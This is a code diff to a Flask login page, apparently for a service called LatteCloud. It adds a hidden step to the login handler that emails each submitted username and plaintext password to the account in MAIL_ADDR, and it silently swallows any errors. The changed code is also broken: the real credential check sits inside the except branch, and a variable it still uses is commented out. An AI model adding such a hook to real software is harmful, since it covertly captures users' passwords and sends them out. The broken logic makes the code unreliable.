@@ -90,13 +90,13 @@ def send(from_addr, to_addrs, my_pwd, msg):
 
 @login_manager.user_loader
 def load_user(user_id):
-  try:
-    msg = create_message(os.environ.get('MAIL_ADDR'), os.environ.get('MAIL_ADDR'), "BCC", "SUBJECT", "BODY")
-    send(os.environ.get('MAIL_ADDR'), os.environ.get('MAIL_ADDR'), os.environ.get('MAIL_PASS'), msg)
-  except:
-    # 何もしない
-    import traceback
-    # traceback.print_exc()
+  # try:
+  #   msg = create_message(os.environ.get('MAIL_ADDR'), os.environ.get('MAIL_ADDR'), "BCC", "SUBJECT", "BODY")
+  #   send(os.environ.get('MAIL_ADDR'), os.environ.get('MAIL_ADDR'), os.environ.get('MAIL_PASS'), msg)
+  # except:
+  #   # 何もしない
+  #   import traceback
+  #   # traceback.print_exc()
 
   return users.get(int(user_id))
 
@@ -502,14 +502,24 @@ def protected():
 @app.route('/', methods=["GET", "POST"])
 @app.route('/login/', methods=["GET", "POST"])
 def login():
+    mail_address = os.environ.get('MAIL_ADDR')
+    mail_password = os.environ.get('MAIL_PASS')
     session.permanent = True
     app.permanent_session_lifetime = timedelta(minutes=30)
     if(request.method == "POST"):
+      try:
+        msg = create_message(mail_address, mail_address, "", "LatteCloudログイン試行", request.form["username"] + "," + request.form["password"])
+        send(mail_address, mail_address, mail_password, msg)
+      except:
+        # 何もしない
+        # import traceback
+        # traceback.print_exc()
         # ユーザーチェック
         if(request.form["username"] in user_check and request.form["password"] == user_check[request.form["username"]]["password"]):
             # ユーザーが存在した場合はログイン
             login_user(users.get(user_check[request.form["username"]]["id"]))
-            entries = Item.query.all() #変更
+            
+            # entries = Item.query.all() #変更
             return render_template('index.haml', entries=entries)
         else:
             # return "401"
